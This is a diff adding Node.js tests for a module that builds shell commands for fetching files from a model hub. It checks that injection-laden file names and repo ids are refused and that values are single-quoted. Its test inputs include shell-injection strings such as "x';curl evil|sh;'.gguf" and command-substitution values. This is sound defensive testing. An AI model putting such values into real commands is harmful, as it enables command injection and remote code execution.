@@ -4,7 +4,8 @@ import { test } from 'node:test';
 import assert from 'node:assert/strict';
 import { createHash } from 'node:crypto';
 import { GatedError, HubFS, listRepo, previewSelection } from './hffs.js';
-import { parseTarget } from './preview.js';
+import { airlockCommands, parseTarget, shellQuote } from './preview.js';
+import { execFileSync } from 'node:child_process';
 
 const COMMIT = 'c0ffee12'.repeat(5);
 
@@ -114,4 +115,38 @@ test('a target names a repo and a revision', () => {
 	assert.deepEqual(parseTarget('org/name'), { repo: 'org/name', revision: 'main' });
 	assert.deepEqual(parseTarget('hf.co/org/name/'), { repo: 'org/name', revision: 'main' });
 	for (const bad of ['', 'name', 'org/../x', 'https://example.com/a/b/c', '%E0%A4%A']) assert.equal(parseTarget(bad), null, bad);
+});
+
+// The commands are copied into a shell, and the repo id, the commit, and the
+// file names come from the hub. A value outside a strict charset is refused,
+// with no command; the rest are single-quoted anyway.
+const okListing = { repo: 'org/m', commit: COMMIT };
+const DIGEST = 'ab'.repeat(32);
+
+test('a file name a shell would act on gets no command', () => {
+	for (const name of ["x';curl evil|sh;'.gguf", 'x;id.gguf', 'x$(id).gguf', 'x`id`.gguf', 'x\nid.gguf', 'x y.gguf']) {
+		const out = airlockCommands(okListing, { include: [name, '*.json'] }, DIGEST);
+		assert.equal(out.commands, undefined, name);
+		assert.match(out.refused, /No command is shown/, name);
+	}
+	for (const listing of [{ repo: "org/m';id;'", commit: COMMIT }, { repo: 'org/m', commit: 'main;id' }]) {
+		assert.equal(airlockCommands(listing, { include: [] }, DIGEST).commands, undefined, JSON.stringify(listing));
+	}
+	assert.equal(airlockCommands(okListing, { include: [] }, 'x;id').commands, undefined);
+});
+
+test('every value in a command is single-quoted', () => {
+	assert.equal(shellQuote("a'b"), "'a'\\''b'");
+	const { commands } = airlockCommands(okListing, { include: ['m-Q4_K_M.gguf', '*.json'] }, DIGEST);
+	assert.ok(commands.includes(`--repo 'org/m' --revision '${COMMIT}'`), commands);
+	assert.ok(commands.includes(`--include 'm-Q4_K_M.gguf,*.json'`), commands);
+	assert.ok(commands.includes(`/incoming/'${DIGEST}'`), commands);
+	assert.ok(commands.includes(`"$E"/'m'`), commands);
+});
+
+test('a quoted value is one word to a real shell', { skip: !process.env.PATH }, () => {
+	for (const v of ["x';id;'", 'x$(id)', 'x`id`', 'a b', 'x\ny', "''"]) {
+		const out = execFileSync('/bin/sh', ['-c', `printf %s ${shellQuote(v)}`], { encoding: 'utf8' });
+		assert.equal(out, v);
+	}
 });
